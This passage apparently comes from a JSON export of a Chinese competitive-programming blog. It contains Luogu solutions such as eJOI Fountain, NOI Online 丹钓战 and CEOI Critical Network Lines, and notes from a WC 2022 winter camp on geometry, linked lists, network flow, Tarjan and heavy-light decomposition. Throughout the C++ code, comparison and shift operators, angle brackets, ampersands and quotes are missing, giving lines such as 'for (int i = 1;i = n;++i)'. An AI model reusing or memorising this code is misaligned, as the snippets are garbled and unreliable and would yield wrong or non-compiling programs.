n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (a[i] 1) ++cnt; for (int i = 1;i = n;++i) if (a[i] 1) continue; int p = 0; while (a[i] % 2 == 0) a[i] /= 2; ++p; mx = min (mx,p); if (cnt == n) printf (0 ); else if (!cnt) printf (%d ,n - 1 + mx); else printf (%d ,n - cnt); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7167 [eJOI 2020 Day1] Fountain","path":"/2022/04/25/P7167/","content":"观察本题题干，发现制约水最终的去处的为盘子的直径与容量。若对于每次询问，都直接暴力计算，显然会超时。于是想到一种能够减少判断次数，又不影响结果的方法—倍增。 首先预处理出从第 $i$ 个圆盘开始连续 $2^j$ 个圆盘中的最大直径，记为 $pre_{i,j}$。显然 $\\forall i \\in [1,n],pre_{i,0} = d_i$。然后就是倍增求最值的过程，这里就不赘述了。然后给出 $f_{i,j},g_{i,j}$，分别表示从 $i$ 开始水溢出 $2^j$ 次后所到达的圆盘与求水溢出所到达的 $2^j$ 个圆盘的容量之和。 但是现在还有一个问题，如果每次遍历去求第 $i$ 个圆盘再加入水后，最终能流到的圆盘，会额外产生 $O(N)$ 的复杂度，加上对所有圆盘的求解以及预处理后的查询，会达到 $O(N^2 \\log N)$ 的复杂度，无法通过此题。不难发现，这其实存在单调性，因此使用二分答案去求解。设预处理的查询函数为 query (l,r)，则有满足 query(i + 1,(l + r) 1) = d[i] 的时候更新左端点为 l = ((l + r) 1) + 1，否则为 r = (l + r) 1。在得到答案 $l$ 后，就可以根据变量设置的含义去更新 $f_{i,0},g_{i,0}$，有 $f_{i,0} = l,g_{i,0} = c_{f_{i,0}}$。 由于 $N_{\\max} = 10^5$，所以本题解将两个数组设置为 f[100005][20],g[100005][20]。则对于 $f_{i,j},g_{i,j}$ 的转移有： for (int j = 1;j 20;++j) for (int i = 1;i = n;++i)//i~i + 2^j = i ~ 2^(j - 1) + (i + 2^(j - 1) + 1)~2^j f[i][j] = f[f[i][j - 1]][j - 1],g[i][j] = g[f[i][j - 1]][j - 1] + g[i][j - 1]; 最后就是求解的部分了。考虑到题目存在流到最终的水池的情况，所以我们可以再加入一个容积为 $\\inf$ 的圆盘。对于每一组的询问，首先判断水能否溢出，若可以，则利用倍增进行处理直至无法溢出，最后特判到达底盘的情况即可。 最后利用倍增的时间复杂度为 $O(n \\log n)$。完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,d[MAX],c[MAX];int pre[MAX][20],f[MAX][20],g[MAX][20];/*pre 预处理求区间最值 f 求从 i 开始水溢出 2^j 次后所到达的圆盘g 求水溢出所到达的 2^j 个圆盘的容量之和 */ int query (int x,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) d[i] = read (),c[i] = read (); for (int i = 1;i = n;++i) pre[i][0] = d[i];//初始化 for (int j = 1;(1 j) = n;++j)//倍增求区间最值 for (int i = 1;i + (1 j) - 1 = n;++i) pre[i][j] = max (pre[i][j - 1],pre[i + (1 (j - 1))][j - 1]); c[n + 1] = INF;f[n][0] = n + 1;g[n][0] = c[f[n][0]];//加入一个超大容积的底盘 for (int i = 1;i n;++i) int l = i + 1,r = n + 1; while (l r)//二分求会流入何处 int mid = (l + r) 1; if (query (i + 1,mid) = d[i]) l = mid + 1;//log 的查询 else r = mid; f[i][0] = l; g[i][0] = c[f[i][0]];//初始化 for (int j = 1;j 20;++j) for (int i = 1;i = n;++i) f[i][j] = f[f[i][j - 1]][j - 1],g[i][j] = g[f[i][j - 1]][j - 1] + g[i][j - 1]; for (int i = 1;i = m;++i) int x = read (),y = read (); if (y c[x]) y -= c[x]; for (int j = 19;j = 0;--j) if (y g[x][j]) y -= g[x][j],x = f[x][j]; x = f[x][0];//注意别忘了减去一开始溢出的那一次 printf (%d ,x == (n + 1) ? 0 : x);//特判 return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int query (int x,int y) int k = (int) log2 (y - x + 1); return max (pre[x][k],pre[y - (1 k) + 1][k]);","categories":["Solution"]},{"title":"题解：P6883 [COCI2016-2017#3] Kroničan","path":"/2022/04/07/P6883/","content":"看到 $1 \\le N,K \\le 20$ 的数据范围，不难想到状态压缩 $\\texttt{dp}$。设 dp[i] 表示所有玻璃杯的状态为 $i$ 时的最小花费。 由于是最小花费，初始化时会将所有的 dp[i] 默认为 INF，然后再特殊处理 dp[0] 的值。那么会有一个问题—对于状态 $i$ 的第 $j$ 位，什么时候表示有水呢？根据布尔变量的思想，容易先入为主的将有水时的状态设为 $1$。但是需要思考的是，倘若此时将 dp[0] = 0，那么就表示所有的水杯（再加上引入的编号为 $0$ 的水杯）均无水时最小花费为 $0$。这样既与题面中的所有的水杯初始均装有一定的水矛盾，在计算时又无法通过 dp[0] 的值去转移。因此，我们便将状态 $i$ 的第 $j$ 位有水时设为 $0$。 状态转移还是比较显然的，倘若 $j$ 杯中有水，那么可以将杯中的水倒入 $k$ 中。这里又有一个小问题，枚举状态的 $i$ 去表示转移前还是转移后呢？我们再将问题的本质聚焦到状态的含义的设置上，由于 $0$ 表示有水，所以当 $i$ 表示转移前时，比较难去处理转移后的状态（原来某一位的 $1$ 将标记为 $0$，而若是 $0$ 则不需要改变），因此本题解选择比较容易的表示转移后的状态的方法。总结一下，也就是说，当满足 i (1 j) == 0 且 i (1 k) == 0 时，进行如下转移：dp[i] = min (dp[i],dp[i ^ (1 j)] + a[j][k])。 最后在统计答案时，由于状态设置的特殊性，需要统计每一状态下 $0$ 的个数，若小于等于 $k$，则进行答案的更新。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 20;const int MOD = 1e9 + 7;inline int read ();int n,k,ans = INF,a[MAX][MAX],dp[1 20]; int count (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();k = read (); for (int i = 0;i n;++i) for (int j = 0;j n;++j) a[i][j] = read (); init (dp); dp[0] = 0;//初始化 for (int i = 1;i (1 n);++i) for (int j = 0;j n;++j) if (!(i (1 j))) continue; for (int k = 0;k n;++k) if (!(i (1 k)))//符合条件即进行转移 dp[i] = min (dp[i],dp[i ^ (1 j)] + a[j][k]); for (int i = 1;i (1 n);++i) if (count (i) = k) ans = min (ans,dp[i]); printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int count (int x) int cnt = 0; while (x) x = (x - 1); ++cnt; return n - cnt;//总位数减去 0 的个数 后记：由于笔者还是个蒟蒻，倘若有大佬可以写出状态 $i$ 的第 $j$ 位有水时设为 $1$ 时且十分简洁的代码（我尝试了好久，但是一直没调出来 $\\texttt{qwq}$），欢迎私信！","categories":["Solution"]},{"title":"题解：P8251 [NOI Online 2022 提高组] 丹钓战","path":"/2022/03/27/P8251/","content":"丹钓战，顾名思义单调栈。 首先是 $\\texttt{15 pts}$ 做法，对于每个询问的区间，进行一次单调栈的模拟。时间复杂度 $O(nq)$。 然后可以稍微的优化一下，我们可以进行 $n$ 次单调栈来维护以第 $i$ 个数为起点的区间的答案。时间复杂度 $O(n^2)$，预计得分 $\\texttt{30 pts}$。 数据点 $11-15$，针对的是序列的一些特殊性质，与最终算法可能关系不大，在此不赘述。接下来讲正解。 一个二元组如果是“成功的”，那么会有一个明显的特征，就是该二元组可以弹出所有入栈的二元组，并成为唯一的二元组被压入栈。当然，栈为空时将其压入栈便是一种特殊的情况，因此可以说是仍然满足该特征。所以我们可以定义 pre[i] 表示第 $i$ 个二元组可以弹出的最早的二元组所对应的编号，显然初始化有 pre[i] = i。询问一段区间中有多少个二元组符合题意，也就是求出该区间中的 pre[i] 满足小于等于区间左端点的个数。举个例子，区间 $[2,4]$ 对应的 pre[i] 的值为 $1,2,3$，则编号为 $2,3$ 的二元组符合题意。所以说，对于一个 pre[i]，它会对区间 [pre[i],i] 均产生贡献。那么，我们只需要按编号从小打大扫描一遍后分别求出询问左端点对应的答案即可。 那么如何求 pre[i] 的值呢，联系题目名称，不禁再次想到单调栈。当栈顶被弹出时，同时更新 pre[i] 的值为 pre[s.top ()] 即可。维护产生的贡献，不难看出是区间加的操作，当求解时，又是单点询问，于是树状数组变成了本题的首选（码量大，常数大的线段树默默靠边）。最后需要注意的一点时，因在扫描时的顺序为编号从小到大，而询问无序，因此我们需要对询问进行处理，以右端点为下标，记录左端点，这样在求解时左端点的答案就已经被计算出来了。总时间复杂度为 $O(n \\log n)$。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include stack#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();vector int point[MAX];stack int s;int n,q,a[MAX],b[MAX],c[MAX],pre[MAX];struct node int l,r,ans; query[MAX];void add (int x,int y);int ask (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) b[i] = read (); for (int i = 1;i = q;++i) query[i].l = read (),query[i].r = read (); point[query[i].r].push_back (i);//右端点为下标 for (int i = 1;i = n;++i) pre[i] = i;//初始化 while (!s.empty () (a[s.top ()] == a[i] || b[s.top ()] = b[i])) pre[i] = pre[s.top ()],s.pop ();//单调栈维护 s.push (i); for (int i = 1;i = n;++i) add (pre[i],1);add (i + 1,-1);//树状数组区间更新 for (int j = 0;j point[i].size ();++j) query[point[i][j]].ans = ask (query[point[i][j]].l);//对于若干个以 i 为右端点的询问，进行求解 for (int i = 1;i = q;++i) printf (%d ,query[i].ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void add (int x,int y) for (int i = x;i = n;i += (i (-i))) c[i] += y;int ask (int x) int sum = 0; for (int i = x;i;i -= (i (-i))) sum += c[i]; return sum;","categories":["Solution"]},{"title":"题解：P8087 『JROI-5』Interval","path":"/2022/02/02/P8087/","content":"这是一道不错的思维题，赛时我的思路是逆向思维法。从长度为 $n$ 的合法区间开始判断，因为由 $f_{r - l + 1} \\rm Mex_{l,r}$可知，若让区间成为合法区间，需要使 $\\rm Mex_{l,r}$ 尽可能大。所以就有了一个策略：从长度为 $n$ 的区间开始，若为合法区间则更新答案，否则去除两端的较大数，直至区间为 $1$。 而对于 $k = \\rm Mex_{l,r}$ 的更新也很简单，由于逆着操作，所以一开始的值为 $n + 1$，当去除数字之后，直接更新为 $\\min (k,x)$，$x$ 表示被去除的数字。 思路十分简单且清晰，那么直接给出代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 4e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,k,l,r,ans = INF;int a[MAX],f[MAX];int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) f[i] = read (); k = n + 1;//k 代表 Mex 函数的值，一开始为 n + 1 l = 1;r = n; for (int i = n;i = 1;--i)//逆向思维 if (f[i] k) ans = min (ans,r - l + 1);//存在合法区间，答案被更新 if (a[l] a[r]) k = min (k,a[r--]);//右侧端较大，去除右侧的数字，同时 k 进行更新 else k = min (k,a[l++]);//去除左端 if (ans == INF) printf (0 );//答案未被更新，也就是没有合法区间 else printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7687 [CEOI2005] Critical Network Lines","path":"/2022/01/24/P7687/","content":"这道题和求普通的割边十分相似。最开始的思路就是将 $a$ 和 $b$ 的情况分别求解，然后再进行合并，然而这样并不行。 本题的关键通信线路和割边并不是充要条件，而是充分不必要条件。有些边虽然是割边，但该边将所有点分为两部分后每部分均有 $A$ 与 $B$，因此并不是关键通信线路。以 $A$ 为例，若某条割边是关键通信线路，则必有一部分全是 $A$，另一部分没有 $A$，$B$ 同理。而统计子树中含有 $A,B$ 的结点数也十分容易，和求子树大小类似，通过递归不断累加即可。 和求普通的割边唯一不同的代码在于判断是否为特殊边时，再加上 !a[v] || a[v] == k || !b[v] || b[v] == l 关于 $A,B$ 数量的判断就行了。由于有 $\\texttt{Special Judge}$ 的设置，在答案累加的同时直接用一个 pair 记录该边相邻的两个结点就行了。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,k,l,cnt,times,ans;int dfn[MAX],low[MAX],a[MAX],b[MAX];int head[MAX * 20],to[MAX * 20],nxt[MAX * 20];pair int,int edge[MAX];void add (int u,int v); void tarjan (int u,int fa);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read ();l = read (); for (int i = 1;i = k;++i) a[read ()] = 1; for (int i = 1;i = l;++i) b[read ()] = 1; for (int i = 1;i = m;++i) int x = read (),y = read (); add (x,y);add (y,x); tarjan (1,0); printf (%d ,ans); for (int i = 1;i = ans;++i) printf (%d %d ,edge[i].first,edge[i].second); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u,int fa) dfn[u] = low[u] = ++times; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v,u); low[u] = min (low[u],low[v]); if (low[v] dfn[u] (!a[v] || a[v] == k || !b[v] || b[v] == l)) edge[++ans] = make_pair (u,v);//唯一不同的地方在这里 a[u] += a[v],b[u] += b[v];//递归累加的过程 else if (v != fa) low[u] = min (low[u],dfn[v]);","categories":["Solution"]},{"title":"WC 2022 学习笔记","path":"/2022/01/22/WC2022/","content":"$\\texttt{Day 1 2022.01.22}$ 开幕式，好耶！ $\\texttt{Day 2 2022.01.23}$ 上午才知道课程都是二选一，选了个第二课堂听听。 前置 向量加减 \\begin{cases} p = (x_1,y_1),q = (x_2,y_2)\\\\ p + q = (x_1 + x_2,y_1 + y_2)\\\\ p - q = (x_1 - x_2,y_1 - y_2) \\end{cases} 向量点积【标量】 \\begin{cases} \\overrightarrow{AB} \\cdot \\overrightarrow{CD} = x_1x_2 + y_1y_2\\\\ \\overrightarrow{AB} \\cdot \\overrightarrow{CD} = |AB||CD| \\cos \\theta \\end{cases} 向量叉积【矢量】 \\begin{cases} \\overrightarrow{AB} \\times \\overrightarrow{CD} = x_1y_2 - x_2y_1\\\\ \\overrightarrow{AB} \\times \\overrightarrow{CD} = |AB||CD|\\sin \\theta \\end{cases}同时有 $\\textbf{0} \\times \\textbf{a} = \\textbf{a} \\times \\textbf{0} = \\textbf{a} \\times \\textbf{a} = \\textbf{0}$。 $|\\textbf{a} \\times \\textbf{b}|$ 在数值上等于 $\\textbf{a},\\textbf{b}$ 构成的平行四边形的面积。 向量旋转 $\\textbf{a} = (x,y)$，逆时针旋转 $\\theta$ 后为 $\\textbf{a’} = (x \\cos \\theta - y \\sin \\theta,x \\sin \\theta + y\\cos \\theta)$。 多边形面积 $S = \\frac{1}{2}|\\sum_{i = 1}^{n} V_i \\times V_i \\mod n + 1|$ 极坐标与极坐标系 误差判断 double eps = 1e-8;return (x eps) - (x eps); 距离 欧式距离 二维 $|AB| = \\sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2}$ 三维 $|AB| = \\sqrt{(x_2 - x_1)^2 + (y_2 - y_1)^2 + (z_2 - z_1)^2}$ 曼哈顿距离 $d(A,B) = |x_1 - x_2| + |y_1 - y_2|$ 切比雪夫距离 $d(A,B) = \\max (|x_1 - x_2|,|y_1 - y_2|)$ 曼哈顿距离与切比雪夫距离的联系 曼哈顿距离 $\\to$ 切比雪夫距离：$(x,y) \\to (x + y,x - y)$ 切比雪夫距离 $\\to$ 曼哈顿距离：$(x,y) \\to (\\dfrac{x + y}{2},\\dfrac{x - y}{2})$。即旋转 $\\frac{\\pi}{4}$ 后缩小一半。 判断 点是否在直线上 ① $(Q - P_1) \\times (P_2 - P_1) = 0$② $Q$ 在以 $P_1,P_2$ 为对角顶点的矩形内 两线段是否相交 ① 快速排斥试验 若两矩形不相交，则线段不相交② 跨立实验 $(P_1 - Q_1) \\times (Q_2 - Q_1) \\ge 0$ 和 $ (Q_2 - Q_1) \\times (P_2 - Q_1) \\ge 0$ 线段和直线是否相交 只需用跨立实验判断即可。 点是否在多边形中 以 $p$ 为端点，向左方作射线 $L$，根据交点个数的奇偶性判断。但需要注意与顶点相交、与边重合的特殊情况。 线段是否在多边形内 ① 两线段端点在多边形内② 线段与多边形所有边都不内交（两线段相交且交点不在两线段的端点） 做法是求出所有与线段相交的顶点，然后按照 $(x,y)$ 排序，若相邻两点中点均在多边形内，则符合条件。 计算 点到线段的最近点 计算点到折线/矩形/多边形的最近点 计算点到圆的最近距离及交点坐标 求线段或直线与圆的交点 均可分为是否与坐标轴平行的两种情况。对于不平行的较复杂情况，通解为联立解方程组然后求出交点。 多边形 二维凸包 例题 P2742 [USACO5.1]圈奶牛Fencing the Cows /【模板】二维凸包 ① Andrew 算法 用单调栈维护，时间复杂度 $O(n \\log n)$。② Graham 扫描算法 找到左下角的点，然后按极角排序。 旋转卡壳 例题 P1452 [USACO03FALL]Beauty Contest G /【模板】旋转卡壳 逆时针枚举凸包边，记录并维护一个当前的最近点（根据叉积计算三角形面积） 半平面交 例题 P4196 [CQOI2006]凸多边形 /【模板】半平面交 \\begin{cases} A_1x + B_1y + C_1 \\ge 0\\\\ A_2x + B_2y + C_2 \\ge 0\\\\ \\cdots\\\\ A_nx + B_ny + C_n \\ge 0 \\end{cases}$S \\ I$ 算法 极角排序，然后维护单调队列（注意先判断队尾再判断队首的情况） 平面最近点对 例题 P7883 平面最近点对 分治的思想，以 $P_m$ 为界，拆分出点集 $A_1,A_2$，然后分别找最近点对，距离为 $h$。再找一个点在 $A_1$，另一个在 $A_2$ 的小于 $h$ 的点对。最后的时间复杂度为 $O(n \\log n)$。 下午有关链表的内容。 双向链表 插入 data[s] = x;left[s] = left[p];right[left[p]] = s;right[s] = p;left[p] = s; 删除 right[left[p]] = right[p];left[right[p]] = left[p]; 恢复 right[left[p]] = p;left[right[p]] = p; 舞蹈链P4929 【模板】舞蹈链（DLX） 一个运用链表到极致的例子。主要步骤如下： ① 矩阵 $A$ 为空，返回已解决。 ② 选择一列 $c$，通常选择 $1$ 的个数最少的那一列。 ③ a. 若 $A_{r,c} = 1$，说明行 $r$ 存在，进入 ④；b. 不存在，回溯，回溯删除，进入 ③ a.。 ④ 把 $r$ 包含进部分解。 ⑤ 对于 $\\forall j,A_{r,j} = 1$，若 $\\forall i,A_{i,j} = 1$，删除第 $i$ 行，否则删除第 $j$ 行。 ⑥ 重复递归。 舞蹈链的思想还可以运用到别的问题中去。我们将矩阵的行的意义为所有的情况，列的意义为约束条件。 $N$ 皇后问题 共有 $n^2$ 个格子，所以矩阵共有 $n^2$ 行。而因每行每列每斜行只能有一个皇后的约束条件，所以有 $n$ 行 $n$ 列，$2n - 1$ 条主对角线与副对角线，即矩阵共有 $6n - 2$ 列。 数独 先分析行，共有 $9 \\times 9$ 个格子，可以填入数字 $1$ 至 $9$，所以共有 $9 \\times 9 \\times 9 = 729$ 行。 每一个格子都需要填入数字，所以要有 $9 \\times 9$ 列存放是否已经填入数字的信息。接下去的 $3$ 个 $9 \\times 9$ 列，分别记录行、列、宫的数字放置情况。所以共需要 $4 \\times 81 = 324$ 列。 跳表例题 P3103 [USACO14FEB]Airplane Boarding G 跳表可以实现链表中的快速查找，从第一个位置的顶端开始一层层往下跳，直至返回 $x$ 不存在。时间复杂度为 $O(\\log n)$，空间复杂度为 $O(n)$【建立在随机选择插入层的前提下】。 例题选讲没听的太明白（其实跳表也不是很明白），选几道洛谷上有的题目列一下。 P7988 [USACO21DEC] HILO G P1792 [国家集训队]种树 晚上营员交流，属于是在听天书。几乎属于听不懂的状态，也就当长长见识了 $\\texttt{qwq}$。 今天一天累计算是听了 $9$ 个多小时，休息去了！$\\texttt{Day 2}$ 结束。 $\\texttt{Day 3 2022.01.24}$ 上午学习网络流，中午的时候到会议间中又听了听《多重时空下的算法竞赛》。 最大流算法妙在建立反向边，主要步骤如下： $S \\to T$ 找到一条增广路 求出流路径中边权最小的值 维护路径中的反向边 重复操作直到 $S$ 与 $T$ 不再连通 于是问题就在于如何找增广路，于是有 $\\textit{SAP}$ 算法，即重建距离标号，将图分成若干个“层次”。其中包含的两个优化就是弧优化（如果一条边已经被增广过，那么它就没有可能被增广第二次）与断层优化（若图上出现了断层，也就是说无法再找到增广路，则可直接终止算法）。 那么这个算法快在哪里呢？通过探寻本质，只有减少冗余以及重复利用可以有效缩短时间。那么该算法通过距离标号，将原来相互独立的增广路相互联系，从而重复利用来节省时间。 费用流下午发现自己学过 tarjan 了，于是想就听听数据结构选讲。但一打开课件就发现都是什么 $\\texttt{IOI}$ 黑题，劝退了……还是听 tarjan 吧！ 求 $\\texttt{LCA}$若 $\\texttt{LCA }(u,v) = k$，当遍历完 $u$ 所在子树后，$u$ 所在子树所有的结点跟 $k$ 其它子树所有结点的 $\\texttt{LCA}$ 一定为 $k$。可以通过并查集维护。伪代码大概如下： fa[v] = v;vis[v] = 1;for (i...) if (!vis[i]) dfs (i),fa[i] = v;for (v...) if (vis[u]) LCA[u][v] = LCA[v][u] = get_fa (u); 若 $\\texttt{LCA }(u,v) = u$，在结点 $u$ 信息返回前，$u$ 结点子树均已访问完，故伪代码此时仍然成立。 例题 codevs 1036 商务问题 题面中强调不存在环，故这是一棵树。考虑树上差分，则有 $dis_{i,j}{\\min} = dep_i + dep_j - 2dep_{LCA(i,j)}$。 求割点若 $u$ 为生成树的根，则 $u$ 为割点的充要条件是 $u$ 的子树 $\\ge 2$。 若 $u$ 不为生成树的根，则 $u$ 为割点的充要条件是在 $v$ 或 $v$ 子孙结点和 $u$ 祖先结点不存在回边。 可以使用时间戳来记录深度优先数与最低深度，有： low[u] = \\min \\begin{cases} dfn[u]\\\\ \\min{(low[v]\\mid v \\texttt{ is children})}\\\\ \\min{(dfn[u]\\mid (u,v) \\texttt{ is cross edge})} \\end{cases}若 $u$ 存在一个孩子 $v$ 使得 $dfn[u] \\le low[v]$，则 $u$ 为割点。 割边若 $(u,v)$ 为割边的充要条件是 $u \\to v$ 不为重边且 $v$ 或 $v$ 的子孙结点中没有指向 $u$ 或 $u$ 祖先的回边。若 $dfn[u] low[u]$，则 $(u,v)$ 为割边（与割点思想类似）。 辨析： 两割点之间的边一定为割边。 错误！反例如下： A-B | | C-D | | E F $C,D$ 为割点，但 $(C,D)$ 不为割边。 割边的两端点均为割点。 错误！反例如下： A-B-C $(A,B)$ 为割边，但 $A$ 不为割点。 例题 P5058 [ZJOI2004]嗅探器 若 $v$ 为割点 - 子树中存在 $b$ - 所求之点 关键在于判断子树中是否存在 $b$，可以通过 $dfn[u]$ 判定。若 $dfn[u] dfn[b]$，则符合条件。 例题 P7687 [CEOI2005] Critical Network Lines 课后补题，解析见我的博文 【题解】P7687 [CEOI2005] Critical Network Lines 。 强连通分量注意，求割点与割边是在无向图中，而强连通分量是在有向图中，要注意区分。 若 $low[u] dfn[u]$，则子孙结点能连到自己上方的结点；若 $dfn[u] = dfn[u]$，则 $u$ 为根，内部仍存在一个或多个强连通分量，递归求解即可。 当 $low[u] = dfn[u]$ 为结束条件进行弹栈得到强连通分量。 例题 P2341 [USACO03FALL][HAOI2006]受欢迎的牛 G 差不多可以说是板子题，缩点后判断是否只有 $1$ 个出度为 $0$ 的点。 晚上趁着晚饭后做了课上讲的一道题，并写了篇题解。 还是营员交流，还是属于听不懂的状态。 $\\texttt{Day 3}$ 结束。 $\\texttt{Day 4 2022.01.25}$ 上午数据结构中的复杂树问题，收获巨大！！！重点主要放在了前三个中，后面基本属于提了提。 树链剖分轻重链剖分。一个定义就是重子结点表示其子结点中子树最大的子结点。 性质 ① 在每条重链结点的 dfn 连续，即优先选择重子结点。② 每个子树内的 dfn 连续。③ 向下经过一条轻边，子树大小至少减半，不超过 $\\log n$ 条重链。④ 重链开头不一定为重子结点。 建树过程 void dfs1 (int u,int fa) sz[u] = 1;f[u] = fa;dep[u] = dep[fa] + 1; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v != fa) dfs1 (v,u); sz[u] += sz[v]; if (sz[v] sz[hson[u]]) hson[u] = v;//求重儿子 树的分解 void dfs2 (int u,int fa) if (hson[u])//优先走重边 seg[hson[u]] = ++seg[0]; top[hson[u]] = top[u];//重链的顶端 rev[seg[0]] = hson[u]; dfs2 (hson[u],u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!top[v]) seg[v] = ++seg[0]; rev[seg[0]] = v; top[v] = v;//此时 (u,v) 为轻边，v 为所在重链的顶端 dfs2 (v,u); P3384 【模板】轻重链剖分/树链剖分 模板题。 例题 P2590 [ZJOI2008]树的统计 通过向上跳来维护信息。若在重链上，则跳到顶端；若不在则在其顶端向上跳一步至重链。直到两点均在同一条重链上即可。核心代码如下： void ask (int u,int v) int fx = top[u],fy = top[v]; while (fx != fy) if (dep[fx] dep[fy]) swap (u,v),swap (fx,fy);//深度大的向上跳 query (1,1,seg[0],seg[fx],seg[u]); u = f[fx],fx = top[u]; if (dep[u] dep[v]) swap (u,v); query (1,1,seg[0],seg[u],seg[v]);//在同一条重链上的不同位置，最后需将这一段区间也进行求解 再放一道练手的题目，几乎也是裸题。 P2146 [NOI2015] 软件包管理器 支持两种操作，树上的区间修改与子树的修改。注意因为涉及 $0$ 和 $1$ 两种情况，因此打懒标记的时候需要注意一下 if (tmp[cur] == -1) return ;，当然忽略这个语句就不存在这个问题了。 伸展树 $\\texttt{splay}$均摊时间复杂度为 $O(\\log n)$，通过势能分析可以得证。伸展树有一个性质，就是中序遍历不会改变。 右旋 zig(x) 左旋 zag(x) rotate 函数 splay 函数 插入 查找 分裂 合并 删除 找寻排名为 $k$ 的数 区间删除 例题 P3391 【模板】文艺平衡树 例题 P3224 [HNOI2012]永无乡 例题 P2042 [NOI2005] 维护数列 下午还是听《新版 $\\texttt{NOI-Linux}$ 系统使用》比较实用叭。 在电脑上成功装了一个 $\\texttt{NOI-Linux}$ 虚拟机，针不戳。捣鼓了一下午的虚拟机，效果如下： 非常好！~~~ $\\texttt{Day 4}$ 结束。 $\\texttt{Day 5 2022.01.26}$ 上午听 $\\texttt{IOI}$ 命题方向。只是停留在听听的层面，但不得不说交互题和构造题等非传统题可以说是兴起了。还看到了一些“恶搞题”，印象最深的就是： 人工智能题？面向数据才是真理！ MoMOOMoo 题 好像有个营员因“不文明语言”被管理员踢了…害怕 $\\texttt{.jpg}$ 下午应该是冬令营的最后一节课了 $\\texttt{awa}$，题目选讲，听听神仙是怎么爆切 $\\texttt{IOI}$ 的叭。 似乎今天 $15:30$ 就结束了哈，明天结营测试，$\\texttt{RP++}$ 吧！ 晚上试机，没啥大问题。 $\\texttt{Day 5}$ 结束。 $\\texttt{Day 6 2022.01.27}$ 两道传统题，一道交互题。先开了 $\\texttt{T2}$，用空间换时间打了一个 $O(nm)$。然后发现啥都不会，交互题主要之前没有做过，所以就不太会格式，最后应该 $\\texttt{CE}$ 了。想着这样肯定也就不能拿牌，所以 $\\texttt{T1}$ 的 $\\texttt{25 pts}$ 最后也没拿。 $\\texttt{Day 7 2022.01.28}$ 很后悔没打那个暴力，果然 $\\texttt{Fe}$ 了，被卡线 $\\texttt{qwq}$。"},{"title":"题解：P7993 [USACO21DEC] Lonely Photo B","path":"/2022/01/01/P7993/","content":"首先时最简单的做法，两层循环逐一判断，时间复杂度为 $O(n^2)$。但是现在无法通过最后一个数据点，需要优化程序。 对于一个从 $i$ 开始的情况，首先用一次二分找到最远的点符合只出现 H 或 G 的情况，设为 $l$。然后再用一次二分找到最远的点符合该区间内只有一个 H 或一个 G 的情况，设为 $r$。那么由题目的意思可知，$[i,n]$ 的区间对答案的贡献为 $r - (l + 1) + 1 = r - l$。注意题目的限制，连续的区间，长度不小于 $3$，因此一些特殊的地方要进行特判。这样，时间复杂度就降到了 $O(n \\log n)$，可以通过本题。 接下来给一下代码：（思路有点奇怪嘿嘿） #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,a[MAX],b[MAX];ll ans;char 